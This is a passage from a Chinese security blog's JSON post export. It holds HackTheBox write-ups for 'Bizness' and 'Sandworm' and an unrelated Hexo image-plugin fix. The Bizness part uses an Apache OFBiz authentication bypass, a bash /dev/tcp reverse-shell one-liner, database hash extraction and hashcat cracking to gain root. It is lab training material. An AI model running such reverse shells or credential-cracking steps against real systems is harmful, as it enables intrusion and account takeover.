\\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://bizness.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response size: 0\n________________________________________________\n\ncontrol                 [Status: 500, Size: 1985, Words: 88, Lines: 15, Duration: 125ms]\n```\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -u 'https://bizness.htb/control/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fl 492\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://bizness.htb/control/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response lines: 492\n________________________________________________\n\nmain                    [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 308ms]\nlogout                  [Status: 200, Size: 10756, Words: 1182, Lines: 180, Duration: 2031ms]\nview                    [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 533ms]\nlogin                   [Status: 200, Size: 11060, Words: 1236, Lines: 186, Duration: 2221ms]\nhelp                    [Status: 200, Size: 10756, Words: 1182, Lines: 180, Duration: 1675ms]\nviews                   [Status: 200, Size: 9308, Words: 913, Lines: 141, Duration: 195ms]\nqrcode                  [Status: 200, Size: 10756, Words: 1182, Lines: 180, Duration: 4229ms]\nforgotPassword          [Status: 200, Size: 11060, Words: 1442, Lines: 175, Duration: 1602ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 14 req/sec :: Duration: [0:09:19] :: Errors: 162 ::\n```\n\n访问一下\n\n![image-20240107140226188](Bizness-HackTheBox/image-20240107140226188.png)\n\n得到了版本信息，Apache OFBiz 18.12 去搜索一下\n\n![image-20240107140303082](Bizness-HackTheBox/image-20240107140303082.png)\n\n确认是存在不少漏洞的\n\n# 漏洞利用\n\n> https://github.com/JaneMandy/CVE-2023-51467-Exploit\n\n找到了一个工具\n\n![image-20240107142434972](Bizness-HackTheBox/image-20240107142434972.png)\n\n成功利用漏洞\n\n> https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass\n\n无法利用的可以使用这个python脚本\n\n然后来反弹一下shell\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# rlwrap nc -nvlp 4444\nlistening on [any] 4444 ...\n```\n\n```\nbash -c 'bash -i >& /dev/tcp/10.10.16.19/4444 0>&1'\n```\n\n执行一下\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# rlwrap nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.19] from (UNKNOWN) [10.10.11.252] 44150\nbash: cannot set terminal process group (742): Inappropriate ioctl for device\nbash: no job control in this shell\nofbiz@bizness:/opt/ofbiz$ whoami&&id\nwhoami&&id\nofbiz\nuid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)\n```\n\n成功获得user\n\n```\ncat user.txt\na51700247dabb7e8c9cca96d714b2da1\n```\n\n成功获得user权限的flag文件\n\n# 权限提升\n\n```\nofbiz@bizness:/opt/ofbiz$ pwd\npwd\n/opt/ofbiz\n```\n\n查看了一下目录，我们在opt目录下，并且在ofbiz文件夹\n\n> https://blog.csdn.net/st780206/article/details/126009515\n\n找到一篇文章，明确了ofbiz的默认数据库是Derby，我们去找一下\n\n```\nofbiz@bizness:/opt/ofbiz/runtime/data/derby$ pwd\npwd\n/opt/ofbiz/runtime/data/derby\n```\n\n成功找到了derby的路径\n\n```\nofbiz@bizness:/opt/ofbiz/runtime/data/derby$ ls -la\nls -la\ntotal 24\ndrwxr-xr-x 5 ofbiz ofbiz-operator 4096 Dec 21 09:15 .\ndrwxr-xr-x 3 ofbiz ofbiz-operator 4096 Dec 21 09:15 ..\n-rw-r--r-- 1 ofbiz ofbiz-operator 2320 Jan  9 07:42 derby.log\ndrwxr-xr-x 5 ofbiz ofbiz-operator 4096 Jan  9 07:42 ofbiz\ndrwxr-xr-x 5 ofbiz ofbiz-operator 4096 Jan  9 07:42 ofbizolap\ndrwxr-xr-x 5 ofbiz ofbiz-operator 4096 Jan  9 07:42 ofbiztenant\n```\n\n在derby目录中有一个ofbiz文件夹\n\n```\nofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ ls -la\nls -la\ntotal 81844\ndrwxr-xr-x 2 ofbiz ofbiz-operator   139264 Dec 21 09:15 .\ndrwxr-xr-x 5 ofbiz ofbiz-operator     4096 Jan  9 07:42 ..\n-rw-r--r-- 1 ofbiz ofbiz-operator     8192 Dec 16 03:38 c10001.dat\n-rw-r--r-- 1 ofbiz ofbiz-operator     8192 Dec 16 03:38 c10011.dat\n-rw-r--r-- 1 ofbiz ofbiz-operator    28672 Dec 16 03:39 c1001.dat\n-rw-r--r-- 1 ofbiz ofbiz-operator     8192 Dec 16 03:38 c10021.dat\n```\n\n在目录`/opt/ofbiz/runtime/data/derby/ofbiz/seg0` 中，有很多的dat文件，直接用grep看看有没有什么敏感信息\n\n直接使用grep进行password自字符进行搜索，因为是dat文件，将二进制当文本的表达出来\n\n```\ngrep -arin -o -E '(\\w+\\W+){0,5}password(\\W+\\w+){0,5}' .\n```\n\n```\n./c54d0.dat:21:Password=\"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I\" enabled\n```\n\n找到了一段hash\n\n```\n$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I\n```\n\n分析一下，$d$这肯定是加了盐的，我们去处理一下，将其解密成hex\n\n![image-20240109212831694](Bizness-HackTheBox/image-20240109212831694.png)\n\n```\nb8 fd 3f 41 a5 41 a4 35 85 7a 8f 3e 75 1c c3 a9 1c 17 43 62\n```\n\n![image-20240109211722890](Bizness-HackTheBox/image-20240109211722890.png)\n\n查看hashcat，发现格式应该是`hash:salt` ，我们将其整理成需要的格式\n\n```\nb8fd3f41a541a435857a8f3e751cc3a91c174362:d\n```\n\n```\nhashcat -m 120 hash /usr/share/wordlists/rockyou.txt\n```\n\n然后使用hashcat跑一下\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# hashcat -m 120 hash /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n============================================================================================================================================\n* Device #1: pthread-12th Gen Intel(R) Core(TM) i5-12400F, 1438/2940 MB (512 MB allocatable), 4MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\nMinimim salt length supported by kernel: 0\nMaximum salt length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Early-Skip\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n* Raw-Hash\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nPure kernels can crack longer passwords, but drastically reduce performance.\nIf you want to switch to optimized kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory required for this attack: 0 MB\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\nb8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  \n                                                          \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 120 (sha1($salt.$pass))\nHash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d\nTime.Started.....: Tue Jan  9 21:29:38 2024 (0 secs)\nTime.Estimated...: Tue Jan  9 21:29:38 2024 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  2259.8 kH/s (0.06ms) @ Accel:256 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)\nProgress.........: 1478656/14344385 (10.31%)\nRejected.........: 0/1478656 (0.00%)\nRestore.Point....: 1477632/14344385 (10.30%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#1....: montano13 -> monkey-moo\nHardware.Mon.#1..: Util: 24%\n\nStarted: Tue Jan  9 21:29:26 2024\nStopped: Tue Jan  9 21:29:39 2024\n```\n\n得到了密码`monkeybizness` \n\n```\nofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ su\nsu\nPassword: monkeybizness\n\nroot@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n成功提权到root\n\n```\nroot@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0# cat /root/root.txt\ncat /root/root.txt\n5db5ded6c308bfce1ae84235ffcbb086\n```\n\n成功拿到root的flag文件\n\n![image-20240109213433760](Bizness-HackTheBox/image-20240109213433760.png)\n","tags":["Hackthebox"]},{"title":"解决 Hexo+Github+Typora 图片无法正确显示的问题","url":"/2023/07/25/学习记录/解决Hexo+Github+Typora图片无法正确显示的问题/","content":"\n# 前言\n\n在之前的【Hexo+GitHub+Indigo 主题搭建博客踩坑日记】中，我们使用 Hexo 搭建好了一个博客，并且成功发布到了网上，接下来就是需要写文章了，而在写文章中通常会加入一些图片来搭配文章，接下来就来解决 Hexo 文章插入文章遇到的一些坑。\n\n# 引用图片\n\n## 全局资源文件夹\n\n在 Hexo 中，最简单的调用图片的方法，就是在 source 目录中新建一个 images（名字可自定义）文件夹，将图片都存入 images 文件夹中，然后在 Markdown 中使用`![图片名字](图片地址)`的格式，比如我们当前有一个名为 image1.png 的图片，就是`![image1](/images/image1.png)`，这里的`/`是指的根目录，而 Hexo 中，资源文件的根目录就是 source 文件夹。\n\n这样我们就插入了一张图片，但是这样做的话有几个麻烦点：\n\n1. 所有的图片都在同一个文件夹下，管理会很混乱很麻烦\n2. 每次引用图片都需要去手动输入，当然也可以修改 Typora 的目录地址，直接设置为 images 目录\n\n### Typora\n\n![image-20230724235328660](解决Hexo+Github+Typora图片无法正确显示的问题/image-20230724235328660.png)\n\n### Web\n\n![image-20230724235146387](解决Hexo+Github+Typora图片无法正确显示的问题/image-20230724235146387.png)\n\n实际这么做以后会发现在 Typora 中说可以看到图片的，但是在网页渲染中却没有加载出来，我们使用 F12 看看是为什么\n\n![image-20230724235456304](解决Hexo+Github+Typora图片无法正确显示的问题/image-20230724235456304.png)\n\n这里读取到的地址是 `http://localhost:4000/images/image1.png` \n\n![image-20230725000145011](解决Hexo+Github+Typora图片无法正确显示的问题/image-20230725000145011.png)\n\n甚至看渲染记录，连图片都没有渲染，这个方法是真的不好用\n\n## 文章资源文件夹\n\n我们也可以对每篇文章使用一个文件夹作为资源管理文件夹，这个方法的优点是便于结构化管理，但缺点也和第一个方法一样，甚至比方法一更麻烦\n\n具体方案需要修改 hexo 文件夹中的 `_config.yml`，如下：\n\n```\npost_asset_folder: true\nmarked:\n  prependRoot: true\n  postAsset: true\n```\n\n在终端下 cd 到 hexo 文件夹，使用 `hexo new [layout] <title>` 命令创建一篇新文章，此时会在 source/_post 目录下创建一个同名的文件夹和 Markdown 文件。\n\n接着可以把所有该文章有关的资源文件都放在同名的目录中，然后使用引入格式 `![image1](image1.png)` 即可引入图片，该方法在有较多文章和较多资源时比较方便管理，但相对的确实比较麻烦\n\n### Typora\n\n![image-20230725000342330](解决Hexo+Github+Typora图片无法正确显示的问题/image-20230725000342330.png)\n\n### Web\n\n![image-20230725000402233](解决Hexo+Github+Typora图片无法正确显示的问题/image-20230725000402233.png)\n\n这个方法呢图片 Web 上倒是成功加载了图片，但 Typora 中却没有显示，这样在我们编写的时候是不便于预览修改的\n\n## 使用网络图片\n\n在 Markdown 的语法中，还允许我们引入网络图片，并且这是一个比较不错的方案，因为不用在本地存储图片，更不用考虑格式错误的问题，但相对的如果是自己的图片就需要考虑先上传到图床然后再来引入了。我个人是一个不太相信第三方的人，所有的资料都得拿在自己手里才安全，任何第三方都有可能跑路、倒闭、丢失资料\n\n网络图片引入格式`![image1](http://target.com/image1.png)` ，直接就可以引入对应地址的图片\n\n### Typora\n\n![image-20230725000548469](解决Hexo+Github+Typora图片无法正确显示的问题/image-20230725000548469.png)\n\n### Web\n\n![image-20230725000618792](解决Hexo+Github+Typora图片无法正确显示的问题/image-20230725000618792.png)\n\n这个方法倒是都显示了，确实是比较不错的方法，但是有一个问题，就是图片是不在自己手里的，哪天图床挂了图片就挂了，且无法找回，并且该方法无法离线编辑，因为你网络离线就代表着无法加载网络图片了\n\n## hexo-asset-image 方法\n\n还有一种方法，用起来很简单但我个人认为是最不好用的方法\n\n需要把 `_config.yml` 中的 `post_asset_image` 修改为 `true` \n\n具体使用方法是 `{% asset_img image1.png image1 %}` \n\n### Typora\n\n![image-20230725001334188](解决Hexo+Github+Typora图片无法正确显示的问题/image-20230725001334188.png)\n\n### Web\n\n![image-20230725001343009](解决Hexo+Github+Typora图片无法正确显示的问题/image-20230725001343009.png)\n\n我觉得吧，就很蠢。。。\n\n# 最终解决方案\n\n这里我研究了很多方法，看了不下几百篇文章，最后得出了一个终极解决方案——直接修改`hexo-asset-image` 插件\n\n首先我们需要安装 `hexo-asset-image` 插件\n\n```\nnpm install hexo-asset-image --save\n```\n\n但是安装后还是没有解决问题哈\n\n然后找到 `/node_modules/hexo-asset-image/index.js` 这个文件，将它的内容替换为如下内容\n\n```\n'use strict';\nvar cheerio = require('cheerio');\n     \n// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string\nfunction getPosition(str, m, i) {\n  return str.split(m, i).join(m).length;\n}\n     \nvar version = String(hexo.version).split('.');\nhexo.extend.filter.register('after_post_render', function(data){\n  var config = hexo.config;\n  if(config.post_asset_folder){\n       var link = data.permalink;\n   if(version.length > 0 && Number(version[0]) == 3)\n      var beginPos = getPosition(link, '/', 1) + 1;\n   else\n      var beginPos = getPosition(link, '/', 3) + 1;\n   // In hexo 3.1.1, the permalink of \"about\" page is like \".../about/index.html\".\n   var endPos = link.lastIndexOf('/') + 1;\n    link = link.substring(beginPos, endPos);\n     \n    var toprocess = ['excerpt', 'more', 'content'];\n    for(var i = 0; i < toprocess.length; i++){\n      var key = toprocess[i];\n      \n      var $ = cheerio.load(data[key], {\n        ignoreWhitespace: false,\n        xmlMode: false,\n        lowerCaseTags: false,\n        decodeEntities: false\n      });\n     \n      $('img').each(function(){\n       if ($(this).attr('src')){\n           // For windows style path, we replace '\\' to '/'.\n           var src = $(this).attr('src').replace('\\\\', '/');\n           if(!/http[s]*.*|\\/\\/.*/.test(src) &&\n              !/^\\s*\\//.test(src)) {\n             // For \"about\" page, the first part of \"src\" can't be removed.\n             // In addition, to support multi-level local directory.\n             var linkArray = link.split('/').filter(function(elem){\n               return elem != '';\n             });\n             var srcArray = src.split('/').filter(function(elem){\n               return elem != '' && elem != '.';\n             });\n             if(srcArray.length > 1)\n               srcArray.shift();\n             src = srcArray.join('/');\n             $(this).attr('src', config.root + link + src);\n             console.info&&console.info(\"update link as:-->\"+config.root + link + src);\n           }\n       }else{\n           console.info&&console.info(\"no src attr, skipped...\");\n           console.info&&console.info($(this));\n       }\n      });\n      data[key] = $.html();\n    }\n  }\n});\n```\n\n然后就可以解决无法同时在 Typora 和 Web 上看到图片的问题了\n\n","categories":["学习记录"]},{"title":"Sandworm - Hackthebox","url":"/2023/06/29/Hackthebox/Medium/Hackthebox-Sandworm/","content":"\n# 靶场信息\n\n![Sandworm](Hackthebox-Sandworm/Sandworm.png)\n\n# 信息收集\n\n## Nmap\n\n首先加入一个 hosts 解析\n\n```\necho 10.10.11.218 ssa.htb >> /etc/hosts\n```\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.218\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 21:51 CST\nWarning: 10.10.11.218 giving up on port because retransmission cap hit (10).\nNmap scan report for ssa.htb (10.10.11.218)\nHost is up (0.40s latency).\nNot shown: 64083 closed tcp ports (reset), 1449 filtered tcp ports (no-response)\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)\n|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)\n80/tcp  open  http     nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to https://ssa.htb/\n443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)\n|_http-title: 400 The plain HTTP request was sent to HTTPS port\n| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA\n| Not valid before: 2023-05-04T18:03:25\n|_Not valid after:  2050-09-19T18:03:25\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nAggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 993/tcp)\nHOP RTT       ADDRESS\n1   465.69 ms 10.10.16.1\n2   320.25 ms ssa.htb (10.10.11.218)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 138.15 seconds\n```\n\n## Http\n\n![image-20230629215457401](Hackthebox-Sandworm/image-20230629215457401.png)\n\n就一个页面，也没什么内容，做个 Fuzz 吧\n\n## Fuzz\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -u 'https://ssa.htb/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://ssa.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\nadmin                   [Status: 302, Size: 227, Words: 18, Lines: 6, Duration: 1728ms]\ncontact                 [Status: 200, Size: 3543, Words: 772, Lines: 69, Duration: 1169ms]\nlogin                   [Status: 200, Size: 4392, Words: 1374, Lines: 83, Duration: 1169ms]\nlogout                  [Status: 302, Size: 229, Words: 18, Lines: 6, Duration: 1174ms]\nabout                   [Status: 200, Size: 5584, Words: 1147, Lines: 77, Duration: 2395ms]\nview                    [Status: 302, Size: 225, Words: 18, Lines: 6, Duration: 1556ms]\nguide                   [Status: 200, Size: 9043, Words: 1771, Lines: 155, Duration: 1976ms]\nprocess                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 1424ms]\n                        [Status: 200, Size: 8161, Words: 2604, Lines: 124, Duration: 2046ms]\npgp                     [Status: 200, Size: 3187, Words: 9, Lines: 54, Duration: 1074ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 66 req/sec :: Duration: [0:17:33] :: Errors: 2 ::\n```\n\n到处看看\n\n### 登录面板\n\n![image-20230629221438163](Hackthebox-Sandworm/image-20230629221438163.png)\n\n访问 login 和 admin、view 都会跳转到登录页面\n\n### contact\n\n![image-20230629221640229](Hackthebox-Sandworm/image-20230629221640229.png)\n\n提交 PGP 的页面\n\n### guide\n\n![image-20230629221808600](Hackthebox-Sandworm/image-20230629221808600.png)\n\n\n\n允许我们利用 PGP 公钥加密、解密或验证文本\n\n![image-20230629221910626](Hackthebox-Sandworm/image-20230629221910626.png)\n\n在最底下有一个可用的用户名 atlas\n\n### PGP\n\n![image-20230629222002980](Hackthebox-Sandworm/image-20230629222002980.png)\n\n是网站的 PGP 公钥\n\n# 漏洞利用\n\n> https://linuxhint.com/generate-pgp-keys-gpg/\n\n经过搜索，可以使用上面地址里提到的方法来生成 PGP 公私钥\n\n## GPG 创建\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# gpg --gen-key\ngpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n\n注意：使用 “gpg --full-generate-key” 以获得一个全功能的密钥生成对话框。\n\nGnuPG 需要构建用户标识以辨认您的密钥。\n\n真实姓名： Lucifiel\n电子邮件地址： LucifielHack@qq.com\n您选定了此用户标识：\n    “Lucifiel <LucifielHack@qq.com>”\n\n更改姓名（N）、注释（C）、电子邮件地址（E）或确定（O）/退出（Q）？ o\n我们需要生成大量的随机字节。在质数生成期间做些其他操作（敲打键盘\n、移动鼠标、读写硬盘之类的）将会是一个不错的主意；这会让随机数\n发生器有更好的机会获得足够的熵。\n我们需要生成大量的随机字节。在质数生成期间做些其他操作（敲打键盘\n、移动鼠标、读写硬盘之类的）将会是一个不错的主意；这会让随机数\n发生器有更好的机会获得足够的熵。\ngpg: /root/.gnupg/trustdb.gpg：建立了信任度数据库\ngpg: 目录‘/root/.gnupg/openpgp-revocs.d’已创建\ngpg: 吊销证书已被存储为‘/root/.gnupg/openpgp-revocs.d/99DC61F38F13D6BDB2736B258E229F58650BFB3E.rev’\n公钥和私钥已经生成并被签名。\n\npub   rsa3072 2023-06-29 [SC] [有效至：2025-06-28]\n      99DC61F38F13D6BDB2736B258E229F58650BFB3E\nuid                      Lucifiel <LucifielHack@qq.com>\nsub   rsa3072 2023-06-29 [E] [有效至：2025-06-28]\n```\n\n## 导出公钥\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# gpg -a -o public.key --export Lucifiel\n```\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# cat public.key \n-----BEGIN PGP PUBLIC KEY BLOCK-----\n\n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\n/gYsDRdC1IzRUH96wcysVYl8sudf2Q==\n=xRpf\n-----END PGP PUBLIC KEY BLOCK-----\n```\n\n## 导出私钥\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# gpg -a -o private-file.key --export-secret-keys Lucifiel\n```\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# cat private-file.key                                    \n-----BEGIN PGP PRIVATE KEY 